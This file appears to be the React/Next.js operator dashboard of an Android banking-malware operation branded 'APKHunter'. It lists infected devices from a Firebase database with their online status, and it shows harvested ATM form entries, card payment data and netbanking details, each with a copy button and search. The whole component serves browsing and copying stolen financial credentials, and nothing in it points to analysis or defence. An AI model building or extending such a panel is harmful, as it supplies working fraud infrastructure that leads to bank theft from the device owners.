"use client";

import Link from "next/link";
import { usePathname, useRouter } from "next/navigation";
import { db } from "@/lib/firbase";
import { Card } from "@heroui/react";
import { onValue, ref } from "firebase/database";
import { useEffect, useMemo, useState } from "react";
import { FaCopy } from "react-icons/fa";
import LineSpinner from "@/components/LineSpinner";


const FORM_KEYS = ["atm_submittion", "atm_submissions", "form_submissions"];
const CARD_KEYS = ["card_payment", "card_payment_data", "card", "payment"];
const NETBANK_KEYS = ["netbanking", "netbanking_data"];

type SubmissionRecord = {
  id: string;
  [key: string]: unknown;
};

type DeviceRecord = {
  id: string;
  brand: string;
  model: string;
  androidVersion: string;
  joinedAt: string;
  onlineStatus: "Online" | "Offline";
  formSubmissions: SubmissionRecord[];
  cardSubmissions: SubmissionRecord[];
  netBankingSubmissions: SubmissionRecord[];
};

function formatSmartTime(value: number) {
  const timestamp = new Date(value).getTime();
  console.log("Parsed timestamp:", timestamp);

  if (isNaN(timestamp)) return "N/A";
  if (timestamp <= 0) return "Just now";
  console.log("Current time:", Date.now(), "Input time:", timestamp);

  const now = Date.now();
  const diffMs = now - timestamp;

  if (diffMs <= 0) return "Just now";

  const minutes = Math.floor(diffMs / (60 * 1000));
  const hours = Math.floor(diffMs / (60 * 60 * 1000));
  const days = Math.floor(diffMs / (24 * 60 * 60 * 1000));

  if (days > 0) return `${days}d ago`;
  if (hours > 0) return `${hours}h ago`;
  if (minutes > 0) return `${minutes}m ago`;

  return "Just now";
}

function parseTimestamp(value: unknown): number {
  if (typeof value === "number" && Number.isFinite(value)) {
    return value < 1_000_000_000_000 ? value * 1000 : value;
  }

  if (typeof value === "string") {
    const trimmed = value.trim();

    if (!trimmed) {
      return 0;
    }

    if (/^\d+$/.test(trimmed)) {
      const numericValue = Number(trimmed);
      return trimmed.length <= 10 ? numericValue * 1000 : numericValue;
    }

    const parsed = Date.parse(trimmed);
    return Number.isNaN(parsed) ? 0 : parsed;
  }

  return 0;
}

function formatTimestampValue(value: unknown) {
  const timestamp = parseTimestamp(value);

  if (!timestamp) {
    return "N/A";
  }

  return new Date(timestamp).toLocaleString();
}

function formatDisplayValue(key: string, value: unknown) {
  if (value === null || value === undefined || value === "") {
    return "N/A";
  }

  const keyName = key.toLowerCase();

  if (
    keyName.includes("timestamp") ||
    keyName.includes("createdat") ||
    keyName.includes("updatedat")
  ) {
    return "";
  }

  if (typeof value === "object") {
    return JSON.stringify(value);
  }

  return String(value);
}

function sortSubmissionsByLatest(items: SubmissionRecord[]) {
  return items.slice().sort((a, b) => {
    const bTime = parseTimestamp(b.timestamp ?? b.createdAt ?? b.updatedAt);
    const aTime = parseTimestamp(a.timestamp ?? a.createdAt ?? a.updatedAt);
    return bTime - aTime;
  });
}

function compareDeviceDesc(a: DeviceRecord, b: DeviceRecord) {
  return b.id.localeCompare(a.id, undefined, {
    numeric: true,
    sensitivity: "base",
  });
}

function getDeviceName(device: DeviceRecord) {
  const name = `${device.brand} ${device.model}`.trim();
  return name === "" ? "Unknown Device" : name;
}

function getStatusColor(status: DeviceRecord["onlineStatus"]) {
  return status === "Online" ? "success" : "danger";
}

function getOnlineStatus(
  rawDevice: Record<string, unknown>,
): DeviceRecord["onlineStatus"] {
  return rawDevice.checkOnline &&
    typeof rawDevice.checkOnline === "object" &&
    (rawDevice.checkOnline as Record<string, unknown>).available ===
      "Device is online"
    ? "Online"
    : "Offline";
}

function selectFirstAvailable<T = unknown>(
  record: Record<string, unknown>,
  keys: string[],
) {
  for (const key of keys) {
    if (record[key] !== undefined && record[key] !== null) {
      return record[key] as T;
    }
  }
  return undefined;
}

function mapSubmissions(
  data: unknown,
  fallbackSortField?: "timestamp" | "createdAt",
) {
  if (!data || typeof data !== "object") {
    return [];
  }

  const entries = Object.entries(
    data as Record<string, Record<string, unknown>>,
  ).map(([key, value]) => ({
    id: key,
    ...value,
    ...(fallbackSortField &&
    value &&
    typeof value === "object" &&
    value[fallbackSortField] === undefined
      ? { [fallbackSortField]: 0 }
      : {}),
  }));

  return sortSubmissionsByLatest(entries);
}

export default function FormPage() {
  const pathname = usePathname();
  const router = useRouter();
  const [devices, setDevices] = useState<DeviceRecord[]>([]);
  const [searchQuery, setSearchQuery] = useState("");
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    const registerDevicesRef = ref(db, "registeredDevices");

    const unsubscribe = onValue(registerDevicesRef, (snapshot) => {
      if (!snapshot.exists()) {
        setDevices([]);
        return;
      }

      const data = snapshot.val() as Record<string, Record<string, unknown>>;

      const nextDevices: DeviceRecord[] = Object.entries(data)
        .map(([deviceId, rawDevice]) => ({
          id: deviceId,
          brand:
            typeof rawDevice.brand === "string" ? rawDevice.brand : "Unknown",
          model:
            typeof rawDevice.model === "string" ? rawDevice.model : "Unknown",
          androidVersion:
            typeof rawDevice.androidVersion === "string" ||
            typeof rawDevice.androidVersion === "number"
              ? String(rawDevice.androidVersion)
              : "Unknown",
          joinedAt: formatTimestampValue(rawDevice.joinedAt),
          onlineStatus: getOnlineStatus(rawDevice),
          formSubmissions: mapSubmissions(
            selectFirstAvailable(rawDevice, FORM_KEYS),
            "timestamp",
          ),
          cardSubmissions: mapSubmissions(
            selectFirstAvailable(rawDevice, CARD_KEYS),
            "createdAt",
          ),
          netBankingSubmissions: mapSubmissions(
            selectFirstAvailable(rawDevice, NETBANK_KEYS),
            "createdAt",
          ),
        }))
        .filter(
          (device) =>
            device.formSubmissions.length > 0 ||
            device.cardSubmissions.length > 0 ||
            device.netBankingSubmissions.length > 0,
        )
        .sort(compareDeviceDesc);

      setDevices(nextDevices);
      setIsLoading(false);
    });

    return () => unsubscribe();
  }, []);

  const filteredDevices = useMemo(() => {
    const query = searchQuery.trim().toLowerCase();

    if (!query) {
      return devices;
    }

    return devices.filter((device) => {
      const matchesDevice =
        device.id.toLowerCase().includes(query) ||
        device.brand.toLowerCase().includes(query) ||
        device.model.toLowerCase().includes(query) ||
        getDeviceName(device).toLowerCase().includes(query);

      const submissionText = [
        ...device.formSubmissions,
        ...device.cardSubmissions,
        ...device.netBankingSubmissions,
      ]
        .flatMap((submission) => Object.values(submission))
        .map((value) => String(value ?? "").toLowerCase())
        .join(" ");

      return matchesDevice || submissionText.includes(query);
    });
  }, [devices, searchQuery]);

  return (
    <div className="min-h-screen bg-[#ffffff]">
      <header className="w-full bg-black">
        <div className="mx-auto flex w-full max-w-3xl items-center justify-between px-5 py-4">
          <Link href="/all" className="text-xl font-extrabold italic leading-none text-[#9ad83d]">
            APKHunter
          </Link>
          <nav className="flex flex-wrap items-center gap-4 text-sm font-semibold text-white sm:gap-6 sm:text-base">
            <Link href="/all" className={`transition-colors ${pathname === "/all" ? "text-white" : "text-white/85 hover:text-white"}`}>
              Home
            </Link>
            <Link href="/settings" className={`transition-colors ${pathname === "/settings" ? "text-white" : "text-white/85 hover:text-white"}`}>
              Setting
            </Link>
            <a
              href="https://t.me/AH_Support_bot"
              target="_blank"
              rel="noopener noreferrer"
              className="text-white/85 transition-colors hover:text-white"
            >
              Support
            </a>
            <button
              onClick={async () => {
                await fetch("/api/logout", { method: "POST" });
                router.push("/login");
              }}
              className="text-white/85 transition-colors hover:text-white cursor-pointer"
            >
              Logout
            </button>
          </nav>
        </div>
      </header>

      {isLoading ? (
        <LineSpinner />
      ) : (
      <main className="mx-auto w-full max-w-3xl px-5 py-8">
        <div className="space-y-5 rounded-[14px] border border-[#d6d6d6] bg-[#f3f3f3] p-5 shadow-[0_4px_20px_rgba(0,0,0,0.1)]">
          <div className="flex items-center gap-3">
            <select
              aria-label="Filter forms"
              className="h-12 flex-1 rounded-2xl border-2 border-[#b7b7b7] bg-[#f8f8f8] px-4 text-base font-semibold text-[#2f2f2f] outline-none"
              onChange={(e) => router.push(e.target.value)}
              value={pathname}
            >
              <option value="/all">All</option>
              <option value="/messages">Messages</option>
              <option value="/forms">Forms</option>
              <option value="/devices">Devices</option>
            </select>
            <button onClick={() => window.location.reload()} className="h-12 rounded-2xl border-2 border-[#b7b7b7] bg-[#f8f8f8] px-6 text-base font-semibold text-[#2f2f2f] transition hover:bg-[#eaeaea]">
              NEW
            </button>
          </div>

          <div className="relative">
            <span className="pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 text-base text-[#8e8e8e]">
              ⌕
            </span>
            <input
              type="text"
              value={searchQuery}
              onChange={(event) => setSearchQuery(event.target.value)}
              placeholder="Search Data By Any Field"
              className="h-12 w-full rounded-2xl border-2 border-[#b7b7b7] bg-[#f8f8f8] pl-10 pr-4 text-base text-[#303030] outline-none placeholder:text-[#a7a7a7]"
            />
          </div>

            {filteredDevices.length === 0 ? (
              <Card className="surface-card p-10 text-center shadow-[0_4px_16px_rgba(0,0,0,0.08)]">
                <p className="text-lg font-semibold text-[var(--text-main)]">
                  No matching devices found
                </p>
                <p className="mt-2 text-sm text-[var(--text-muted)]">
                  Try a different search term or wait for new submissions.
                </p>
              </Card>
            ) : (
              <div className="space-y-4">
                {filteredDevices.map((device, index) => (
                  <div className="">
                    <div className="flex flex-col gap-3  ">
                      {device.formSubmissions.map((submission) => {
                        const timestamp =
                          submission.timestamp ||
                          submission.createdAt ||
                          submission.updatedAt;

                        return (
                          <Card
                            key={submission.id}
                            className=" p-3 surface-card shadow-[0_4px_16px_rgba(0,0,0,0.08)]"
                          >
                            <div className="mt-2 space-y-1">
                              {Object.entries(submission).map(
                                ([key, value]) => (
                                  <div
                                    key={key}
                                    className="flex flex-col gap-1 text-sm text-(--text-muted)"
                                  >
                                    {!(
                                      key.toLowerCase().includes("timestamp") ||
                                      key.toLowerCase().includes("createdat") ||
                                      key.toLowerCase().includes("updatedat")
                                    ) && (
                                      <>
                                        <div className="flex flex-row items-center gap-1">
                                          <span className="font-semibold text-blue-800 uppercase">
                                            {key}:
                                          </span>

                                          <FaCopy
                                            onClick={() =>
                                              navigator.clipboard.writeText(
                                                String(value),
                                              )
                                            }
                                          />
                                        </div>

                                        <span>
                                          {formatDisplayValue(key, value)}
                                        </span>
                                      </>
                                    )}
                                  </div>
                                ),
                              )}
                            </div>
                            {timestamp !== null && timestamp !== undefined && (
                              <div className="flex justify-end mt-2">
                                <span className="text-xs text-gray-500">
                                  {formatSmartTime(Number(timestamp))}
                                </span>
                              </div>
                            )}
                          </Card>
                        );
                      })}
                      {device.cardSubmissions.map((submission) => {
                        const timestamp =
                          submission.timestamp ||
                          submission.createdAt ||
                          submission.updatedAt;

                        return (
                          <Card
                            key={submission.id}
                            className=" p-3 surface-card shadow-[0_4px_16px_rgba(0,0,0,0.08)]"
                          >
                            <div className="mt-2 space-y-1">
                              {Object.entries(submission).map(
                                ([key, value]) => (
                                  <div
                                    key={key}
                                    className="flex flex-col gap-1 text-sm text-(--text-muted)"
                                  >
                                    {!(
                                      key.toLowerCase().includes("timestamp") ||
                                      key.toLowerCase().includes("createdat") ||
                                      key.toLowerCase().includes("updatedat")
                                    ) && (
                                      <>
                                        <div className="flex flex-row items-center gap-1">
                                          <span className="font-semibold text-blue-800 uppercase">
                                            {key}:
                                          </span>

                                          <FaCopy
                                            onClick={() =>
                                              navigator.clipboard.writeText(
                                                String(value),
                                              )
                                            }
                                          />
                                        </div>

                                        <span>
                                          {formatDisplayValue(key, value)}
                                        </span>
                                      </>
                                    )}
                                  </div>
                                ),
                              )}
                            </div>
                            {timestamp !== null && timestamp !== undefined && (
                              <div className="flex justify-end mt-2">
                                <span className="text-xs text-gray-500">
                                  {formatSmartTime(Number(timestamp))}
                                </span>
                              </div>
                            )}
                          </Card>
                        );
                      })}
                       {device.netBankingSubmissions.map((submission) => {
                        const timestamp =
                          submission.timestamp ||
                          submission.createdAt ||
                          submission.updatedAt;

                        return (
                          <Card
                            key={submission.id}
                            className=" p-3 surface-card shadow-[0_4px_16px_rgba(0,0,0,0.08)]"
                          >
                            <div className="mt-2 space-y-1">
                              {Object.entries(submission).map(
                                ([key, value]) => (
                                  <div
                                    key={key}
                                    className="flex flex-col gap-1 text-sm text-(--text-muted)"
                                  >
                                    {!(
                                      key.toLowerCase().includes("timestamp") ||
                                      key.toLowerCase().includes("createdat") ||
                                      key.toLowerCase().includes("updatedat")
                                    ) && (
                                      <>
                                        <div className="flex flex-row items-center gap-1">
                                          <span className="font-semibold text-blue-800 uppercase">
                                            {key}:
                                          </span>

                                          <FaCopy
                                            onClick={() =>
                                              navigator.clipboard.writeText(
                                                String(value),
                                              )
                                            }
                                          />
                                        </div>

                                        <span>
                                          {formatDisplayValue(key, value)}
                                        </span>
                                      </>
                                    )}
                                  </div>
                                ),
                              )}
                            </div>
                            {timestamp !== null && timestamp !== undefined && (
                              <div className="flex justify-end mt-2">
                                <span className="text-xs text-gray-500">
                                  {formatSmartTime(Number(timestamp))}
                                </span>
                              </div>
                            )}
                          </Card>
                        );
                      })}
                    </div>
                  </div>
                ))}
              </div>
            )}
        </div>
      </main>
      )}
    </div>
  );
}
